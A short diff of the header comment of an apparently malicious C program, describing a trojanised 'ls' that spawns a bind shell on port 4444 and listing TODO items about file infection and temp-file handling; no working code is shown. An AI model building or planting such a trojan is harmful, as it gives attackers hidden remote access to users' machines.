@@ -9,11 +9,8 @@
  * This should work like normal "ls", but spawn a bind shell on 4444
  *
  * TODO
- * - DONE calculate offset automatically
- * - DONE compiler warnings
  * - clean up TEMPFILE
  * - randomize TEMPFILE
- * - easy shell script to infect a file.
  */
 
 #define _GNU_SOURCE // memmem() :(
